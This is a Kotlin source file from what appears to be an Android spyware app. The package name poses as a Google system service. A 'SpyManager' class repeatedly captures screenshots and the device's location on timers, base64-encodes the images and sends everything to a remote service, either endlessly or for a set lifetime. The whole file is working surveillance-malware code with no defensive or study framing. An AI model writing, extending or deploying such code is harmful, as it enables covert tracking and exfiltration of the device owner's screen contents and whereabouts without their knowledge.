package com.android.google.services.spymanager

import android.os.Build
import android.os.CountDownTimer
import com.android.google.constants.LocationConstants
import com.android.google.constants.ScreenshotConstants
import com.android.google.remote.RemoteService
import com.android.google.remote.models.LocationDTO
import com.android.google.remote.models.ScreenshotDTO
import com.android.google.services.screenshoot.IScreenshotService
import com.android.google.services.tracker.LocationService
import com.android.google.utils.logw
import com.android.google.utils.toBase64
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/*
* Manage all services
* Optional: create manager with helper (singleton way)
* */

class SpyManager(
    private var remote: RemoteService,
    private var screenshotService: IScreenshotService
) {

    private var enabled = false
    private lateinit var screenshotTimer: CountDownTimer
    private lateinit var locationTimer: CountDownTimer
    private lateinit var stopTimer: CountDownTimer

    init {
        logw("SpyManager. Activated.")
    }

    fun start(
        screenshotService: Boolean,
        locationService: Boolean,
        lifetime: Long = SpyHelper.ENDLESS
    ) {
        if (enabled) return

        logw("SpyManager. Started.")
        enabled = true
        if (screenshotService) enableScreenshotService()
        if (locationService) enableLocationService()

        if(lifetime != SpyHelper.ENDLESS) startStopTimer(lifetime)
    }

    fun stop() {
        if(this::screenshotTimer.isInitialized) screenshotTimer.cancel()
        if(this::locationTimer.isInitialized) locationTimer.cancel()
        if(this::stopTimer.isInitialized) stopTimer.cancel()

        logw("SpyManager. Stopped.")
    }

    private fun startStopTimer(lifetime: Long) {
        stopTimer = object : CountDownTimer(lifetime, lifetime) {
            override fun onTick(millisUntilFinished: Long) {
                stop()
            }

            override fun onFinish() {}

        }.start()
    }

    private fun enableLocationService() {
        val interval = LocationConstants.UPDATE_INTERVAL

        locationTimer = object : CountDownTimer(interval * 2, interval) {
            override fun onTick(millisUntilFinished: Long) {
                getAndSendLocation()
            }

            override fun onFinish() {
                locationTimer.start()
            }

        }.start()
    }

    private fun enableScreenshotService() {
        val interval = ScreenshotConstants.UPDATE_INTERVAL

        screenshotTimer = object : CountDownTimer(interval * 2, interval) {
            override fun onTick(millisUntilFinished: Long) {
                takeAndSendScreenshot()
            }

            override fun onFinish() {
                screenshotTimer.start()
            }

        }.start()
    }

    private fun getAndSendLocation() = CoroutineScope(Dispatchers.IO).launch {
        val location = LocationService.getLocation()
        val locationDTO = LocationDTO(location.lat, location.lon)

        remote.sendLocation(location = locationDTO)
    }

    fun takeAndSendScreenshot() = CoroutineScope(Dispatchers.IO).launch {
        val screenBitmap = screenshotService.takeScreenshot()
        val base64 = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            screenBitmap.toBase64()
        } else {
            SpyHelper.BASE_BITMAP
        }

        val screenshotDTO = ScreenshotDTO(base64 = base64)
        remote.sendScreenshot(screenshotDTO)
    }

}

/*
* Create SpyManager with SpyHelper object
* */

object SpyHelper {

    val BASE_BITMAP = ""
    val ENDLESS = -1L
    private var INSTANCE: SpyManager? = null

    fun initialize(
        remote: RemoteService,
        screenshotService: IScreenshotService
    ): SpyManager {
        if (INSTANCE != null) return INSTANCE!!

        val temp = SpyManager(
            remote = remote,
            screenshotService = screenshotService
        )

        INSTANCE = temp

        return temp
    }

}